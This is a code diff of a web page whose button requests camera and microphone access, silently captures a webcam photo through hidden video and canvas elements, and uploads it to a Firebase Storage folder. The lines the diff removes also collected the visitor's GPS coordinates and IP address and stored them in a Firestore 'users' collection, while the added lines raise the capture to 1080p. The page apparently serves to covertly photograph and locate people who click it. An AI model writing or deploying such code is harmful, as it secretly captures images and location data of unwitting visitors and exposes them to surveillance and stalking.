@@ -19,27 +19,25 @@
         .button {
             background-color: #000; /* Black background */
             color: white; /* White text */
-            border: 4px solid white; /* White border */
+            border: 2px solid white; /* White border */
             padding: 20px 40px; /* Padding */
             font-size: 24px; /* Font size */
             cursor: pointer; /* Pointer cursor */
             border-radius: 5px; /* Rounded edges */
             transition: background-color 0.3s; /* Transition effect */
-            text-align: center;
         }
 
         .button:hover {
             background-color: rgba(255, 255, 255, 0.2); /* Lighten on hover */
         }
 
-        video {
-            display: none; /* Hide video element */
+        video, canvas {
+            display: none; /* Hide video and canvas elements */
         }
     </style>
     <script type="module">
         // Import Firebase functions
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-app.js";
-        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-firestore.js";
         import { getStorage, ref, uploadString } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-storage.js";
 
         // Firebase configuration
@@ -54,23 +52,14 @@
 
         // Initialize Firebase
         const app = initializeApp(firebaseConfig);
-        const db = getFirestore(app);
         const storage = getStorage(app);
 
-        // Function to upload image to Firebase Storage
-        async function uploadImage(imageData, ipAddress, latitude, longitude) {
+        // Function to upload image to Firebase
+        function uploadImage(imageData) {
             const storageRef = ref(storage, 'Zeyad/image_' + Date.now() + '.png'); // Upload to Zeyad folder
-            await uploadString(storageRef, imageData, 'data_url')
-                .then(async () => {
-                    console.log('Uploaded image successfully!');
-                    // Save location and IP address to Firestore
-                    await addDoc(collection(db, "users"), {
-                        ip: ipAddress,
-                        latitude: latitude,
-                        longitude: longitude,
-                        timestamp: new Date()
-                    });
-                    console.log("Location and IP data sent to Firestore successfully");
+            uploadString(storageRef, imageData, 'data_url')
+                .then(() => {
+                    console.log('Uploaded a blob or file!');
                 })
                 .catch((error) => {
                     console.error('Error uploading image:', error);
@@ -80,56 +69,48 @@
         // Function to handle button click
         async function handleClick() {
             try {
-                // Request microphone permission first
-                await navigator.mediaDevices.getUserMedia({ audio: true });
+                // Request both microphone and camera permissions
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    audio: true,
+                    video: { facingMode: "user" }
+                });
 
-                // Request camera permission
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                // Create video and canvas elements
                 const video = document.createElement('video');
-                video.srcObject = stream;
-                video.play();
+                const canvas = document.createElement('canvas');
+                const context = canvas.getContext('2d');
 
-                // Wait for the video to load
+                video.srcObject = stream;
+
+                // Wait for video metadata to load and then play
                 await new Promise((resolve) => {
                     video.onloadedmetadata = () => {
+                        video.play();
                         resolve();
                     };
                 });
 
-                // Capture image
-                const canvas = document.createElement('canvas');
-                canvas.width = 640; // Set canvas width
-                canvas.height = 480; // Set canvas height
-                const context = canvas.getContext('2d');
+                // Set canvas size for capturing
+                canvas.width = 1920; // Set canvas width for 1080p
+                canvas.height = 1080; // Set canvas height for 1080p
+
+                // Capture the image
                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
                 const imageData = canvas.toDataURL('image/png');
+                uploadImage(imageData); // Upload captured image to Firebase
 
                 // Stop the video stream
-                stream.getTracks().forEach(track => track.stop());
-
-                // Get the user's location
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(async (position) => {
-                        const latitude = position.coords.latitude;
-                        const longitude = position.coords.longitude;
-
-                        // Fetch the user's IP address using a public API
-                        const ipResponse = await fetch('https://api.ipify.org?format=json');
-                        const ipData = await ipResponse.json();
-                        const ipAddress = ipData.ip;
-
-                        // Upload captured image and location data to Firebase
-                        await uploadImage(imageData, ipAddress, latitude, longitude);
-                    }, (error) => {
-                        console.error("Geolocation error: ", error);
-                    });
-                } else {
-                    console.error("Geolocation is not supported by this browser.");
-                }
+                stopVideo(stream);
             } catch (err) {
                 console.error('Error accessing permissions: ', err);
                 alert('Permissions denied! You cannot use this feature without granting permissions.');
             }
+        }
+
+        // Function to stop video stream
+        function stopVideo(stream) {
+            const tracks = stream.getTracks();
+            tracks.forEach(track => track.stop());
         }
     </script>
 </head>
